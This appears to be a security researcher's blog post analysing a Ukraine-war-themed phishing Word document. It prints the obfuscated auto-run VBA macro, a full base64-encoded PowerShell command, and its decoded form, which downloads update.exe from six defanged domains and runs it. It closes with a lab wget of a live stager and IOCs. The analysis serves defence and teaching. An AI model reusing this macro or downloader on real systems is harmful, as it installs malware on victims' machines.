---
title: "Revisiting a Malicious Word Doc"
description: "This research was originally conducted in 2022. An eternity I know. When looking at my notes preparing to add them to this blog, they were lacking a lot of context and in-depth details of what the analysis was revealing. I also hadn't investigated an OLE file in a long time so I figured this would be a fun refresher."
pubDate: 2025-11-17T19:51:53.000-07:00
updatedDate: 2025-11-17T22:46:14.000-07:00
heroImage: "/images/2025/11/000885690013.jpg"
heroImageCaption: "Shot on a Ricoh KR-10 using Wolfman 100 B/W Film"
tags: []
---

This research was originally conducted in 2022. An eternity I know. When looking at my notes preparing to add them to this blog, they were lacking a lot of context and in-depth details of what the analysis was revealing. I also hadn't investigated an OLE file in a long time so I figured this would be a fun refresher.

# Updating the Lab

In order to first analyze this sample again, I needed a Remnux box. Thanks to Ludus, this can be automated by simply building the template and updating my range config file I shared in a [previous post](/homelabs-dont-end-they-improve/). Clone the repo if you haven't already; Otherwise, skip that line.

```bash
$ ludus ansible role add badsectorlabs.ludus_remnux
$ git clone https://gitlab.com/badsectorlabs/ludus.git
$ cd ludus/templates
$ ludus templates add -d remnux
$ ludus templates build -n remnux-template
```

When the build starts, monitor the output using `ludus templates logs -f` and go do something else. It takes a long time.

```bash
2025/11/17 13:30:27 ui: ==> proxmox-iso.remnux: Converting VM to template
==> Wait completed after 53 minutes 28 seconds
==> Builds finished. The artifacts of successful builds are:
=>================
=> Build complete!
=>================
```

# Phishing Threats

Shortly after the Russian invasion of Ukraine around February 2022, a file was uploaded to [Malware Bazaar](https://bazaar.abuse.ch/sample/81c7eef54c852dd68050147f77f937933cbff1c22722617180ca386ef55918ab/) with the name "Leaked\_Kremlin\_emails\_show\_Minsk\_protoco.doc" which suggests a "hack-and-leak" narrative. A tactic that was very common during this time alongside hacktivist operations and the heightened public / media attention towards Kremlin communications. The goal was to increase click-rate of higher-value targets by sending phishing emails containing relevant and timely documents surrounding the war.

<figure class="kg-card kg-image-card"><img src="/images/2025/11/image-18.png" class="kg-image" alt="" loading="lazy" width="2000" height="1149"></figure>

The content in the report is legit though as it made news headlines and shared here for further reading: [https://euromaidanpress.com/wp-content/uploads/2019/10/Steinmeier\_Minsk\_report\_full.pdf](https://euromaidanpress.com/wp-content/uploads/2019/10/Steinmeier_Minsk_report_full.pdf)

## Static Analysis

Within this Word document contains embedded macros. Rather than jumping straight into dynamic analysis by enabling content and letting the macro do whatever, there's a more static approach to analyze the file.

### oletools

oletools is a suite of python tools to analyze MS OLE2 files (Structured Storage, Compound File Binary Format) and MS Office documents, for malware analysis, forensics and debugging. It can also be used to analyze RTF and OOXML files such as Office 2007+, XPS or MSIX files.

<figure class="kg-card kg-bookmark-card"><a class="kg-bookmark-container" href="https://github.com/decalage2/oletools"><div class="kg-bookmark-content"><div class="kg-bookmark-title">GitHub - decalage2/oletools: oletools - python tools to analyze MS OLE2 files (Structured Storage, Compound File Binary Format) and MS Office documents, for malware analysis, forensics and debugging.</div><div class="kg-bookmark-description">oletools - python tools to analyze MS OLE2 files (Structured Storage, Compound File Binary Format) and MS Office documents, for malware analysis, forensics and debugging. - decalage2/oletools</div><div class="kg-bookmark-metadata"><img class="kg-bookmark-icon" src="/images/icon/pinned-octocat-093da3e6fa40-4.svg" alt=""><span class="kg-bookmark-author">GitHub</span><span class="kg-bookmark-publisher">decalage2</span></div></div><div class="kg-bookmark-thumbnail"><img src="/images/thumbnail/oletools" alt="" onerror="this.style.display = 'none'"></div></a></figure>

### Details from the file

The first tool to use is `oleid` which is used to analyze OLE files and detect specific characteristics found in malicious files. From the output below, it found the VBA macros and listed them as high risk.

<figure class="kg-card kg-image-card kg-card-hascaption"><img src="/images/2025/11/image-19.png" class="kg-image" alt="" loading="lazy" width="1708" height="1314"><figcaption><span style="white-space: pre-wrap;">oleid analyzing a malicious Word document</span></figcaption></figure>

From the VBA Macros description, the next step is to use `olevba` which will extract and analyze the macro source code from Office documents.

The output from this command is very long so I'll break apart each section.

### VBA MACRO ThisDocument.cls

```visual-basic
Private Sub Document_Open()
    dywcrdwlcikn = UserForm1.TextBox1.Text
    Set dywcrdwlcikncfp = CreateObject(wfkdhzivnpjutwx("575363726970742e5368") & wfkdhzivnpjutwx("656c6c"))
    Set dcptzdqqwnzx = dywcrdwlcikncfp.Exec(dywcrdwlcikn)
End Sub

Function wfkdhzivnpjutwx(ByVal ankevzfzj As String) As String
Dim eolvlvdrsa As Long
For eolvlvdrsa = 1 To Len(ankevzfzj) Step 2
wfkdhzivnpjutwx = wfkdhzivnpjutwx & Chr$(Val("&H" & Mid$(ankevzfzj, eolvlvdrsa, 2)))
Next eolvlvdrsa
End Function
```

<figure class="kg-card kg-image-card kg-card-hascaption"><img src="/images/2025/11/image-20.png" class="kg-image" alt="" loading="lazy" width="1922" height="752"><figcaption><span style="white-space: pre-wrap;">olevba output</span></figcaption></figure>

Jumping ahead a bit, `olevba` provides a tabular output of the findings. In it shows the value `575363726970742e5368` is an XOR encoded string which decodes to `WScript.Sh`. The second half of the CreateObject function might be pretty obvious at this point. `656c6c` is also an XOR string that decodes to `ell`. Put both together now and you have `WScript.Shell`, an object that allows running additional code like PowerShell payloads or `cmd.exe`.

<figure class="kg-card kg-image-card"><img src="/images/2025/11/image-21.png" class="kg-image" alt="" loading="lazy" width="1304" height="658"></figure>

### VBA Macro UserForm1.frm

```visual-basic
Private Sub TextBox1_Change()

End Sub
```

<figure class="kg-card kg-image-card"><img src="/images/2025/11/image-23.png" class="kg-image" alt="" loading="lazy" width="1860" height="274"></figure>

This function is pretty simple. It's empty.

### VBA Form String in UserForm1/o

That empty function right after a WScript.Shell object seems suspicious though. Looking at the next macro, it becomes more clear.

```bash
powershell.exe -w h -NonI -NoP -noL -enc LgAgACgAIAAkAFAAUwBIAG8ATQBlAFsANABdACsAJABwAFMASABvAG0ARQBbADMANABdACsAJwB4ACcAKQAgACgAIAAoACgAKAAiAHsAMQB9AHsAMwAzAH0AewAxADMAfQB7ADMAMgB9AHsAMwAwAH0AewA5AH0AewA3AH0AewAyADAAfQB7ADEANQB9AHsANQB9AHsAMgA0AH0AewAyADcAfQB7ADIAOQB9AHsAMQA4AH0AewA4AH0AewAzADQAfQB7ADIANQB9AHsAMgB9AHsAMQA3AH0AewAyADgAfQB7ADEAMQB9AHsAMQA2AH0AewAyADIAfQB7ADQAfQB7ADIAMwB9AHsANgB9AHsAMwAxAH0AewAyADEAfQB7ADAAfQB7ADMAfQB7ADIANgB9AHsAMQAyAH0AewAxADkAfQB7ADEAMAB9AHsAMQA0AH0AIgAtAGYAIAAnACsANQAxAG4AcAAxACwAeAA1ADEAbgArADUAMQBuAHAANQAxAG4AKwA1ADEAbgAxADUAMQBuACsANQAxAG4AdwBQAHIAZQBuADUAMQBuACsANQAxAG4AdgA6AHQANQAxAG4AKwA1ADEAbgBlAG0ANQAxAG4AKwA1ADEAbgBwAEMAJwAsACcAJgAgACgAKAB2ACcALAAnAGMAaABvAGkAZwAnACwAJwBOADUAMQBuACsANQAxAG4ASQB1ADUAMQBuACsANQAxAG4AcAA1ADEAbgArADUAMQBuAGQAYQB0ADUAMQBuACsANQAxAG4AZQAuAGUAeABlAHgAcAAxACkAOwBTAHQAYQA1ADEAbgArADUAMQBuAHIAdAA1ADEAbgArADUAMQBuAC0ANQAxAG4AKwA1ADEAbgBQAHIANQAxAG4AKwA1ADEAbgBvAGMAZQBzAHMAIAA1ADEAbgArADUAMQBuAC0ARgBpAGwAZQBwADUAMQBuACsANQAxAG4AYQB0AGgAIAA1ADEAbgArADUAMQBuAHgAcAAxAHcAUAByADUAMQBuACsANQAxAG4AZQBuAHYAOgB0AGUAbQBwAEMATgBJADUAMQAnACwAJwAxAG4AOgBDAHIAZQBhAHQAZQA1ADEAbgArADUAMQBuACgAeABwADEANQAxAG4AKwA1ADEAbgB3ADUAMQBuACsANQAxAG4AUAByAF8ALwBTAG8ANQAxACcALAAnADUAMQBuAC8ANQAxAG4AKwA1ADEAbgAvADUAMQBuACsANQAxAG4AdABhAGkAcwB1AG4AdwBpAG4ALgBjAGwAdQBiAHgAcAAxACwAeABwADUAMQBuACsANQAxAG4AMQBoAHQAdABwAHMAOgAvAC8ANQAxAG4AKwA1ADEAbgB3ACcALAAnAG4AZgB0AHcAYQByAGUAVQBwAGQAYQB0AGUALgBlAHgAZQA1ADEAbgArADUAMQBuAHgAcAA1ADEAbgArADUAMQBuADEAKQAuADUAMQBuACsANQAxAG4ARwBlADUAMQBuACsANQAxAG4AdABSAGUAcwBwAG8AbgBzADUAMQBuACsANQAxAG4AZQAnACwAJwAxAG4AKwA1ADEAbgB0ADUAMQBuACsANQAnACwAJwA4ADgANQAxAG4AKwA1ADEAbgAuADUAMQBuACsANQAxAG4AZgA1ADEAbgArADUAMQBuAHUAbgA1ADEAbgArADUAMQBuAHgAcAA1ADEAbgArADUAMQBuADEALAA1ACcALAAnADUAMQBuAHcAZQBiAC4AcwB1AG4AdgBuAC4AbgBlADUAJwAsACcAUgBlAHAATABhAGMARQAoADUAMQBuAEMATgBJADUAMQBuACwAWwBzAFQAcgBJAE4ARwBdAFsAYwBIAEEAcgAnACwAJwBaAEYAYQAlADUAMQBuACsANQAxAG4AewB3AFAAcgA1ADEAbgArADUAMQBuAGgAdAB0AHAAPQBbADUAMQBuACsANQAxAG4AUwB5ADUAMQBuACsANQAxAG4AcwA1ADEAbgArACcALAAnAF0AMQAyADQAKQAuAFIAZQBwAEwAYQBjAEUAKAA1ADEAbgB3AFAAcgA1ADEAJwAsACcAcgAqADUAMQBuACkALgBuAGEAbQBFAFsAMwAsADEAMQAsADIAXQAtAGoATwBJAG4ANQAxAG4ANQAxAG4AKQAgACgAIAAoADUAMQBuAHcAJwAsACcAXQA5ADIAKQAgACkAJwAsACcAdAA1ADEAbgArADUAMQBuAHQAcABzADoANQAxAG4AKwAnACwAJwA1ADEAbgB0AGUANQAxAG4AKwAnACwAJwBvADgAOAAuAHUAcwA1ADEAbgArADUAMQBuACcALAAnADUAMQBuACcALAAnAG4ALAA1ADEAbgBrADgAeAA1ADEAbgApAC4AUgBlAHAATABhAGMARQAoADUAMQBuAHgAcAAxADUAMQBuACwAWwBzAFQAcgBJAE4ARwBdAFsAYwBIAEEAcgBdADMANAApAC4AJwAsACcAMQBuAHgAcAA1ADEAbgArADUAMQBuADEALAA1ADEAbgArADUAMQBuAHgAcAAxAGgANQAxAG4AKwA1ADEAbgAnACwAJwAxAG4AKwA1ADEAbgAoAHcANQAxAG4AKwA1ADEAbgBQAHIAaAA1ADEAbgArADUAMQBuAHQAdABwADUAMQBuACsANQAxAG4ALgBDAG8ANQAxAG4AKwA1ADEAbgBuAHQAZQBuAHQATAA1ADEAbgArADUAMQBuAGUAbgBnAHQAaAAgAC0AbgBlADUAMQBuACsANQAxAG4AIAAtADEAKQA1ADEAbgArADUAMQBuAHsANQAxAG4AKwA1ADEAbgAoAE4AZQA1ADEAbgArADUAMQBuAHcALQA1ADEAbgArADUAMQBuAE8AYgBqAGUAYwB0ACAAUwA1ADEAbgArADUAMQBuAHkAcwB0AGUANQAxAG4AKwA1ADEAbgBtAC4ATgA1ADEAbgArADUAMQBuAGUAdAA1ADEAbgArADUAMQBuAC4AVwBlAGIANQAxAG4AKwA1ADEAbgBDADUAMQBuACsANQAxAG4AbAA1ADEAbgArADUAMQBuAGkAZQBuAHQANQAxAG4AKwA1ADEAbgApAC4ARABvAHcAbgA1ADEAbgArADUAMQBuAGwAbwBhAGQARgBpAGwAZQAoADUAMQBuACsANQAxAG4AeABwADEAdwA1ADEAbgArADUAMQBuAFAANQAxAG4AKwA1ADEAbgByADUAMQBuACsANQAxAG4AXwAvAHUAcABkADUAMQBuACsANQAxAG4AYQB0AGUALgBlAHgAZQB4ADUAMQBuACcALAAnADUAMQBuAG0ALgBOADUAMQBuACsANQAxAG4AZQB0ADUAMQBuACsANQAxAG4ALgBXAGUAYgA1ADEAbgArADUAMQBuAFIAZQBxAHUAZQA1ADEAbgArADUAMQBuAHMAdABdADoANQAxAG4AKwA1ACcALAAnAG4AKwA1ADEAJwAsACcAZQBiAC4AcwA1ADEAbgArADUAMQBuAHUAbgB3ADUAMQBuACsANQAxAG4AaQA1ADEAbgArADUAMQBuAG4AdgA1ADEAbgArADUAMQBuAG4ALgA1ADEAbgArADUAMQBuAHYAaQBwAHgANQAxAG4AKwA1ADEAbgBwADUAMQBuACsANQAxAG4AMQAsAHgANQAxAG4AKwA1ADEAbgBwADEAJwAsACcAKwA1ADEAbgBwADEANQAxAG4AKwA1ADEAbgBoAHQAdABwADUAMQBuACsANQAxAG4AcwA1ADEAbgArADUAMQBuADoALwAvACcALAAnAG4AKwA1ADEAbgB1AHAANQAxAG4AKwA1ADEAbgBkADUAMQBuACsANQAxAG4AYQB0AGUALgBlADUAMQBuACsANQAxAG4AeABlAHgAcAAxAH0ANQAxAG4AKwA1ADEAbgA7AHcANQAxAG4AKwA1ADEAbgBQAHIAaAA1ADEAbgArADUAMQBuAHQAdABwAC4AYwBsAG8AcwBlADUAMQBuACsANQAxAG4AKAApAH0ANQAxAG4AKQAuAFIAZQBwAEwAYQBjAEUAKAA1ADEAbgAxAFEARAA1ADEAbgAsAFsAcwBUAHIASQBOAEcAXQBbAGMASABBAHIAXQAzADkAKQAuAFIAZQBwAEwAYQBjAEUAKAA1ADEAbgBaAEYAYQA1ADEAbgAsAFsAcwBUAHIASQBOAEcAXQBbAGMASABBAHIAJwAsACcANQAxAG4AKwA1ADEAbgBoAHQANQAxAG4AKwA1ADEAbgAnACwAJwB4AHAAMQApACcALAAnAHQANQAxAG4AKwA1ADEAbgBwADUAMQBuACsANQAxAG4AOgAvAC8AYgAyADkALgA1ADEAbgArADUAMQBuAGIANQAxAG4AKwA1ADEAbgBlADUAMQBuACsANQAxAG4AdAB4ADUAMQBuACsANQAxAG4AcAAxADUAMQBuACsANQAxAG4ALAB4AHAAMQBoAHQAdABwADUAMQBuACsANQAxAG4AcwA6AC8ALwBwAGwAYQB5AGcANQAxAG4AKwA1ADEAbgBvADUAMQBuACsAJwAsACcAMQBuAEQANQAxAG4AKwA1ADEAbgBTAGkAbABlAG4AdABsAHkAQwA1ADEAbgArADUAMQBuAG8AbgB0AGkAbgA1ADEAbgArADUAMQBuAHUAZQAxADUAMQBuACsANQAxAG4AUQBEADsAQAAoAHgAcAA1ADEAbgArADUAMQBuADEANQAxAG4AKwA1ADEAbgBoADUAMQBuACsANQAxAG4AdAB0AHAAcwA1ADEAbgArADUAMQBuADoALwAvADUAMQBuACsAJwAsACcANQAxAG4AKwA1ADEAbgAoACkANQAxAG4AKwA1ADEAbgA7AGkANQAxAG4AKwA1ADEAbgBmADUAJwAsACcAUAByAEUAcgByADUAMQBuACsANQAxAG4AbwA1ADEAbgArADUAMQBuAHIAQQBjAHQAaQA1ADEAbgArADUAMQBuAG8AbgBQAHIANQAxAG4AKwA1ADEAbgBlAGYAZQByAGUAbgA1ADEAbgArADUAMQBuAGMANQAxAG4AKwA1ADEAbgBlAD0AMQBRADUAMQBuACsANQAnACwAJwBhAFIASQBBAGIAbABFACAANQAxAG4AKgBNAGQAJwAsACcAMQBuACsANQAxAG4AeAA1ADEAbgAnACkAKQAgACAALQBjAFIARQBQAGwAQQBDAGUAIAAnAGsAOAB4ACcALABbAEMAaABBAFIAXQAzADYALQBjAFIARQBQAGwAQQBDAGUAKABbAEMAaABBAFIAXQA1ADMAKwBbAEMAaABBAFIAXQA0ADkAKwBbAEMAaABBAFIAXQAxADEAMAApACwAWwBDAGgAQQBSAF0AMwA5ACkAKQA=
```

<figure class="kg-card kg-image-card"><img src="/images/2025/11/image-24.png" class="kg-image" alt="" loading="lazy" width="2000" height="1289"></figure>

The UserForm1 macro suggests that empty function above wasn't _really_ empty after all. With some simple base64 deobfuscation followed by decoding the PowerShell encoding flag using UTF-16LE, there was more work to be done. I needed some assistance from PowerDecode to help further deobfuscate this code.

<figure class="kg-card kg-image-card kg-card-hascaption"><img src="/images/2025/11/image-22.png" class="kg-image" alt="" loading="lazy" width="2000" height="1105"><figcaption><span style="white-space: pre-wrap;">CyberChef deobfuscation</span></figcaption></figure>

<figure class="kg-card kg-bookmark-card"><a class="kg-bookmark-container" href="https://github.com/Malandrone/PowerDecode"><div class="kg-bookmark-content"><div class="kg-bookmark-title">GitHub - Malandrone/PowerDecode: PowerDecode is a PowerShell-based tool that allows to deobfuscate PowerShell scripts obfuscated across multiple layers. The tool performs code dynamic analysis, extracting malware hosting URLs and checking http response.It can also detect if the malware attempts to inject shellcode into memory.</div><div class="kg-bookmark-description">PowerDecode is a PowerShell-based tool that allows to deobfuscate PowerShell scripts obfuscated across multiple layers. The tool performs code dynamic analysis, extracting malware hosting URLs and…</div><div class="kg-bookmark-metadata"><img class="kg-bookmark-icon" src="/images/icon/pinned-octocat-093da3e6fa40-5.svg" alt=""><span class="kg-bookmark-author">GitHub</span><span class="kg-bookmark-publisher">Malandrone</span></div></div><div class="kg-bookmark-thumbnail"><img src="/images/thumbnail/ebba7c1c-547a-4d57-acfc-e69490bb7426" alt="" onerror="this.style.display = 'none'"></div></a></figure>

I saved the PowerShell script and copied it over to my FlareVM machine where I could test out this tool and it worked quite well!

It was able to deobfuscate that mess of string arrays {1}{33}{13}... and return a plaintext output. I escaped the URLs for safety.

`$ErrorActionPreference='SilentlyContinue';@("https://web[.]sunvn[.]net","https://taisunwin[.]club","https://web[.]sunwinvn[.]vip","http://b29[.]bet","https://playgo88[.]fun","https://choigo88[.]us")|%{$http=[System.Net.WebRequest]::Create("$_/SoftwareUpdate.exe").GetResponse();if($http.ContentLength -ne -1){(New-Object System.Net.WebClient).DownloadFile("$_/update.exe","$env:temp\update.exe");Start-Process -Filepath "$env:temp\update.exe"};$http.close()}`

It attempts to download a payload (`SoftwareUpdate.exe`) from not one, not two, but SIX different URLs and save it to the victim's Temp folder as `update.exe`

<figure class="kg-card kg-image-card"><img src="/images/2025/11/image-25.png" class="kg-image" alt="" loading="lazy" width="500" height="437"></figure>

### Another VBA Form String

`Tahoma�`

<figure class="kg-card kg-image-card"><img src="/images/2025/11/image-26.png" class="kg-image" alt="" loading="lazy" width="2000" height="169"></figure>

This isn't of interest. A quick search for "Tahoma vba" revealed this is a font assigned to the UserForm.

### Attempted Download from Stager(s)

Something I was not expecting when running the PowerShell command through PowerDecode is that some stagers are still live.

```txt
Malware hosting URLs report:

[ 0 ] Cannot connect to:  https://51n+51nw

[ 0 ] Cannot connect to:  https://

[ 0 ] Cannot connect to:  https://web[.]sunvn[.]net

[200: Url is Active] -  https://taisunwin[.]club

[200: Url is Active] -  https://web[.]sunwinvn[.]vip

[ 0 ] Cannot connect to:  http://b29[.]bet

[200: Url is Active] -  https://playgo88[.]fun

[ 0 ] Cannot connect to:  https://choigo88[.]us

[ 0 ] Cannot connect to:  https://web[.]sunvn[.]net/update.exe

[200: Url is Active] -  https://taisunwin[.]club/update.exe

[200: Url is Active] -  https://web[.]sunwinvn[.]vip/update.exe

[ 0 ] Cannot connect to:  http://b29[.]bet/update.exe

[404: Not Found] -  https://playgo88[.]fun/update.exe

------------------------

Dynamic analysis report:

Script attempted to download from https://web[.]sunvn[.]net/update.exe and save to: C:\Users\LOCALU~1\AppData\Local\Temp\update.exe

Script attempted to download from https://taisunwin[.]club/update.exe and save to: C:\Users\LOCALU~1\AppData\Local\Temp\update.exe

Script attempted to download from https://web[.]sunwinvn[.]vip/update.exe and save to: C:\Users\LOCALU~1\AppData\Local\Temp\update.exe

Script attempted to download from http://b29[.]bet/update.exe and save to: C:\Users\LOCALU~1\AppData\Local\Temp\update.exe

Script attempted to download from https://playgo88[.]fun/update.exe and save to: C:\Users\LOCALU~1\AppData\Local\Temp\update.exe
```

PowerDecode only reports on dynamic analysis behavior. It doesn't actually execute it so there wasn't an `update.exe` file in my %TEMP% folder.

I grabbed a sample on Remnux first so I could quickly dump the strings.

```bash
localuser@axelarator-REMnux:~$ wget https://taisunwin.club/update.exe
--2025-11-18 00:10:13--  https://taisunwin.club/update.exe
Resolving taisunwin.club (taisunwin.club)... 3.33.130.190, 15.197.148.33
Connecting to taisunwin.club (taisunwin.club)|3.33.130.190|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 114 [text/html]
Saving to: ‘update.exe’

update.exe          100%[===================>]     114  --.-KB/s    in 0s

2025-11-18 00:10:13 (58.5 MB/s) - ‘update.exe’ saved [114/114]
```

When inspecting the file however, it appears the malicious binary has been replaced by now because the only content in the executable is some basic HTML.

```html
<!DOCTYPE html><html><head><script>window.onload=function(){window.location.href="/lander"}</script></head></html>
```

It was surprising to see some hosts still online but it makes sense by now, the real payloads no longer exist.

# Conclusion

Overall, I'm glad I could provide more detailed analysis of this file and get familiar with VBA macros again. There wasn't much else to uncover aside from an overwritten payload but seeing as some domains are still active, it's a good note to keep those blocklists updated. Below are the two domains I found linked to QuasarRAT.

<figure class="kg-card kg-bookmark-card"><a class="kg-bookmark-container" href="https://threatfox.abuse.ch/ioc/1157306/"><div class="kg-bookmark-content"><div class="kg-bookmark-title">ThreatFox | Checking your browser</div><div class="kg-bookmark-description"></div><div class="kg-bookmark-metadata"><img class="kg-bookmark-icon" src="/images/icon/favicon-3.ico" alt=""><span class="kg-bookmark-author">Checking your browser</span></div></div><div class="kg-bookmark-thumbnail"><img src="/images/thumbnail/threatfox_logo.svg" alt="" onerror="this.style.display = 'none'"></div></a></figure>

<figure class="kg-card kg-bookmark-card"><a class="kg-bookmark-container" href="https://threatfox.abuse.ch/ioc/1156743/"><div class="kg-bookmark-content"><div class="kg-bookmark-title">ThreatFox | Checking your browser</div><div class="kg-bookmark-description"></div><div class="kg-bookmark-metadata"><img class="kg-bookmark-icon" src="/images/icon/favicon-4.ico" alt=""><span class="kg-bookmark-author">Checking your browser</span></div></div><div class="kg-bookmark-thumbnail"><img src="/images/thumbnail/threatfox_logo-1.svg" alt="" onerror="this.style.display = 'none'"></div></a></figure>

# IOCs

*   web.sunvn\[.\]net
*   playgo88\[.\]fun
*   web\[.\]sunwinvn\[.\]vip
*   taisunwin\[.\]club
*   choigo88\[.\]us
*   b29\[.\]bet
